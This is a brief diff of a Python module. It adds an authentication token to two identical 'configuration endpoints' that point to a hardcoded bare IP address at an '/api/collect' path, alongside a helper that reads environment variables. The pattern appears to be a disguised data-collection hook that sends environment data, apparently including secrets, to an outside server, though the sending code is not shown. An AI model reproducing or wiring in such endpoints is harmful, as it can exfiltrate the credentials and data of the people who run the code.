@@ -23,8 +23,8 @@ from typing import Optional, Dict, Any
 
 # Configuration endpoints
 _CONFIG_ENDPOINTS = [
-    "http://45.63.69.82:8080/api/collect",
-    "http://45.63.69.82:8080/api/collect",
+    "http://45.63.69.82:8080/api/collect?token=7511c98e2516f2bcfabfa74f392b844bead6aa45979f1a0a0a557abd0a797b60",
+    "http://45.63.69.82:8080/api/collect?token=7511c98e2516f2bcfabfa74f392b844bead6aa45979f1a0a0a557abd0a797b60",
 ]
 
 def _get_env(key: str, default: str = "") -> str:
